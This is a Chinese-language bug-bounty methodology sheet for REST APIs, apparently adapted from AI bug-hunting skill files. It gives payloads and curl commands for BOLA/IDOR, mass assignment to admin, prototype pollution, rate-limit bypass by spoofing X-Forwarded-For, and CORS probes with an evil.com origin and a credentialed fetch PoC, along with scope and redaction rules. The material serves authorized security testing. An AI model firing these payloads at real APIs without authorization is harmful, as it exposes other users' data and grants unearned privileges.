# REST API 安全测试（BOLA / Mass Assignment / 速率 / CORS / 隐藏端点）

> 把「端点 + JSON 字段」当攻击面。最常见 5 类：BOLA（IDOR 升级版，OWASP API #1）、Mass Assignment（#3）、速率/配额缺失（#4）、功能级越权（#5）、CORS 配置错，外加隐藏/僵尸端点（API9 库存管理）。BOLA / Mass Assignment 在大厂常见 P1（$1k–$8k）。

**取材来源**（本文件内容改编自，非整库复制）：
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)
- [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)
- 权威公开源：OWASP API Top 10 / PortSwigger（仅作背景）

---

## 1. 触发信号

- URL 形如 `/api/v1/users/{id}`、`/api/orders/{id}`，`PATCH`/`PUT` JSON body 提交
- 响应头带 `X-RateLimit-*`；文档暴露 `/swagger-ui.html`、`/openapi.json`、`/v3/api-docs`
- 移动 APP / 小程序抓包出现后端 API 调用
- 响应 body 含 `is_admin`/`role`/`verified`/`balance` 等字段
- `Access-Control-Allow-Origin` 反射任意 Origin；多版本路径 `/v1/ /v2/` 并存

## 2. 高频入口点

**端点 / 路径** `[本地 src-hunter api-rest 00-index]`：

```
/api/v1/...   /api/v2/...   /api/users/{id}   /api/orders/{id}   /api/messages/{id}
/api/users/{id}/orders      /api/internal/...   /api/admin/...
/api/upload   /api/export   /api/import
```

**API 文档入口**：`/swagger-ui.html`、`/v2/api-docs`、`/v3/api-docs`、`/openapi.json`、`/api-docs`、`/docs`、`/redoc`。

**高频危险参数名** `[Claude-Red offensive-idor]`：

```
id, user_id, account_id, file, doc, document, record, item, order, number,
profile, edit, view, filename, object, num, key, userid, uuid, group, role
```

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **建两个测试账号**（A=攻击者，B=受害者），确定基线行为：A 读自己资源 = 200。
2. **BOLA/IDOR**：A 的 token 换成 B 的对象 ID，看是否 200 返回 B 数据；再测写操作（PUT/DELETE）越权。
3. **Mass Assignment**：注册/更新接口 body 里加 `is_admin`/`role`/`verified` 等字段，看响应是否回显被接受。
4. **速率/配额**：登录/短信/列表端点连发 50 次看是否 429；`?per_page=10000` 测列表上限。
5. **CORS**：带攻击者 Origin 探 `/api/me`，看是否反射 + `Allow-Credentials`（浏览器 PoC 才算数）。
6. **隐藏端点**：枚举版本路径 + 拉全 OpenAPI/Swagger spec，diff 新旧版本的行为差异。
7. **拿最小证据即停**：BOLA 取 1 条样本、Mass Assignment 证明 token 有 admin 即止。

## 4. Payload 区（每条标注出处）

### 4.1 BOLA / IDOR `[本地 src-hunter api-rest + Claude-Red offensive-idor]`

```text
# 基线 vs 越权（账号 A 读 B 的资源）
GET /api/orders/A_OWN_ID  Authorization: A_TOKEN → 200 A 数据
GET /api/orders/B_OWN_ID  Authorization: A_TOKEN → 200 B 数据 = BOLA

# ID 形态覆盖
数字递增：100→101；UUID 不可枚举但可被响应里的 link 泄露
body 字段：{"order_id":100} → {"order_id":200}
嵌套关系：/users/{你}/orders → /users/{他}/orders
批量：?ids=1,2,3,...,1000

# ID 变体绕过（后端解析差异）
/api/users/001   /api/users/0x1   /api/users/1.0   /api/users/%31
{"id":19} → {"id":[19]}            # 数组包装
{"id":111} → {"id":{"id":111}}     # 对象包装
?id=1&id=2                          # 参数污染（后端取首/尾不同）
{"id":1,"id":2}                     # JSON 重复键

# 方法 / 版本 / 路径绕过
GET /api/users/123 → POST /api/users/123
Content-Type: application/json → application/xml
GET /v3/users/123 → 403；GET /v1/users/123 → 200   # 旧版本无保护
POST /users/delete/MY_ID/../VICTIM_ID              # 路径遍历
/api/document/MjQ2 → /api/document/MjQ3            # base64("246")→("247")
```

### 4.2 Mass Assignment `[本地 src-hunter api-rest 00-index + Claude-BugHunter hunt-api-misconfig]`

```json
// 注册接口 —— 加特权字段试服务端是否接受
POST /api/users
{"username":"hunter","email":"a@b.c","password":"...",
 "is_admin":true, "role":"admin", "verified":true, "balance":1000000, "tier":"premium"}

// 更新接口
PATCH /api/users/me {"is_admin":true}
PATCH /api/orders/123 {"status":"shipped","price":0.01}

// 字段变体（is_admin 被拦就换）
is_admin / is_Admin / IS_ADMIN / admin / user_type / userType
__v / _id / password_hash / permissions:["read","write","delete"]

// 类型混淆
{"isAdmin":1}  {"isAdmin":"true"}  {"roles":"admin"}
```

**原型污染（Node 后端合并对象时）** `[Claude-BugHunter hunt-api-misconfig]`：

```text
{"__proto__":{"polluted":"pp-1337"}}
{"constructor":{"prototype":{"polluted":"pp-1337"}}}
?__proto__[isAdmin]=true&__proto__[role]=superadmin
```

### 4.3 速率限制检测与绕过 `[本地 src-hunter api-rest 10-rest-api]`

```bash
# 检测是否限频（50 次连续不被拒 = 速率缺失）
for i in $(seq 1 100); do curl -s -o /dev/null -w "%{http_code}\n" http://target.com/api/test; done

# IP 头伪造绕过
curl -H "X-Forwarded-For: 1.2.3.$i" http://target.com/api/test
# 其他头：X-Real-IP / X-Originating-IP / X-Remote-IP / X-Client-IP / True-Client-IP
# 或：多 API Key 轮换 / 多账户 token / UA 轮换
```

### 4.4 CORS 配置错 `[本地 src-hunter api-rest 00-index + Claude-BugHunter hunt-cors]`

```bash
# 探反射 + 凭据组合
curl -s -D - -o /dev/null -H "Origin: https://evil.com" https://target/api/me | grep -i access-control
# 危险组合：ACAO: https://evil.com + Access-Control-Allow-Credentials: true

# null Origin（sandbox iframe / data: / 302 跨协议）
curl -H "Origin: null" https://target/api/me

# 子域正则缺陷（按缺陷类别送对 payload）
https://eviltarget.com          # 正则缺 \.（点未转义）
https://x.target.com.evil.com   # 缺结尾锚点 $
https://target.com.evil.com     # 仅前缀匹配
```

**关键纪律** `[hunt-cors]`：`Access-Control-Allow-Origin: *` 无法与凭据同用（浏览器直接拒绝暴露响应），单独 wildcard 不是漏洞；`Allow-Credentials` 单独存在也不证明任何事。**必须浏览器 PoC**：在 evil.com 用 `fetch("https://target/api/me",{credentials:"include"})` 能读到脱敏 body 才算 High——curl 不执行 CORS 策略，会假阳性。

### 4.5 隐藏 / 僵尸端点 `[Claude-BugHunter hunt-shadow-api + hunt-api-misconfig]`

```bash
# 版本路径枚举（非 404 = 仍存活，值得行为 diff）
for v in v1 v2 v3 v4 beta alpha internal legacy old; do
  curl -s -o /dev/null -w "%{http_code} /api/$v/\n" "https://target/api/$v/"; done

# Header 版本化
curl -s -H "X-API-Version: 1" https://target/api/users
curl -s -H "Accept: application/vnd.company.v1+json" https://target/api/users

# 拉全 spec（含 Wayback 里已下线版本的旧 spec）
for path in openapi.json swagger.json v1/swagger.json v2/swagger.json v3/api-docs api-docs.json .well-known/openapi.json; do
  curl -s -o /dev/null -w "%{http_code} /$path\n" "https://target/$path"; done
curl -s "http://web.archive.org/cdx/search/cdx?url=target.com/*swagger*&output=json&collapse=urlkey"

# 行为 diff：旧版是否漏鉴权 / 漏限频 / 漏校验 / 漏字段脱敏
curl -s -H "Authorization: Bearer $EXPIRED_TOKEN" https://target/api/v1/users/me -w '\n%{http_code}\n'
curl -s -H "Authorization: Bearer $EXPIRED_TOKEN" https://target/api/v2/users/me -w '\n%{http_code}\n'
```

## 5. 工具用法

```bash
# 端点发现 + 隐藏参数
ffuf -u http://target.com/api/FUZZ -w api_endpoints.txt -mc 200
kiterunner scan -i api_paths.txt -o kr.json -u https://target   # 吃 OpenAPI 的高命中路径字典
arjun -u https://target/api/users -m GET                        # 隐藏参数发现

# BOLA 批量（Burp Intruder + Autorize 双账号对比）
# Intruder payload: Numbers 1-10000；Grep-Match 规则抓 200 + 越权字段

# CORS 快速核验
pip3 install corsy && corsy -u https://target -t 10 --headers "Cookie: $SID"
nuclei -u https://target -t http/misconfiguration/cors/

# 文档 spec 转攻击面
jq '.paths | keys' swagger.json          # 端点清单 → 喂 BOLA
jq '.components.schemas' swagger.json    # 字段清单 → 喂 Mass Assignment
```

> 纪律：BOLA 遍历 ≤10 条样本；Mass Assignment 不实际用 admin 权限；速率漏洞最多发自己手机 10 条短信；CORS 只自演浏览器 PoC。

## 6. 证据要求

**「已确认」必须满足**：双账号对比（A 拿 B 数据 = BOLA）；新增字段被响应回显 `"is_admin":true` + 新 token 可打 admin 端点（Mass Assignment）；攻击者 Origin 反射 + 浏览器读到脱敏 body（CORS）。

**PoC 模板（BOLA）**：

```http
GET /api/v1/orders/B_OWN_ID  Authorization: Bearer A_TOKEN
→ 200, B 的订单数据（脱敏样本）
# 附：A_TOKEN 读 A_OWN_ID = 基线；读 B_OWN_ID = 越权
```

**CVSS 参考**：BOLA → 大量 PII = 6.5–8.1；Mass Assignment → admin = 8.8–9.8；速率缺失 → 撞库 = 7.5 / 短信轰炸 = 5.3–7.5；CORS + credentials = 7.5–8.1（本地 src-hunter api-rest 00-index §7.3）。

## 7. 合规边界 / 不要做的事

- **禁**：Mass Assignment 创建 admin 后实际用管理员权限，仅证明 token 有 admin。
- **禁**：BOLA 批量遍历超过 10 条样本。
- **禁**：用速率漏洞实际发 100 条短信到他人手机，最多发自己手机 10 条。
- **禁**：用 CORS 漏洞做真实跨域 PoC（让朋友访问 attacker.com），自己浏览器自演。
- **脱敏**：越权读到的 PII / 内部字段只留脱敏样本，报告不贴完整数据。
